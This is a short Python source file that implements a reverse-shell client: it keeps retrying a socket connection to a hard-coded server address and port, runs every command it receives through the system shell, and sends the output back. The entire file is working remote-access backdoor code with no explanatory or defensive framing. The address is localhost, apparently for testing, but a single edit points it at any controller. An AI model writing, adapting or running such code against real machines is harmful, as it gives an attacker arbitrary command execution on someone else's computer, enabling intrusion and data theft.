import socket
import sys, os, io
import ctypes
import time
import subprocess as sp

server = ('127.0.0.1', 11719) 
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def run_command(command):
    encoding = os.device_encoding(1) or ctypes.windll.kernel32.GetOEMCP()
    out = sp.Popen(command, stdout=sp.PIPE, shell=True)
    result = io.TextIOWrapper(out.stdout, encoding='cp866')

    return result.read()

# Function connect to server
def connect():
    try:
        sock.connect(server)
        return True
    except:
        return False

# Connecting to server
def while_connect():
    connecting = True

    while connecting:
        if connect():
            connecting = False
        else:
            time.sleep(5)

while_connect()

# Data exchange
while True:
    try:
        command = sock.recv(4096).decode() 

        if command == "exit":
            break

        else:
            result = run_command(command)
            length = str(len(result)).zfill(16)
            sock.send((length + result).encode()) 
    except:
        try:
            sock.send("\nexcept")
        except: 
            pass

sock.close()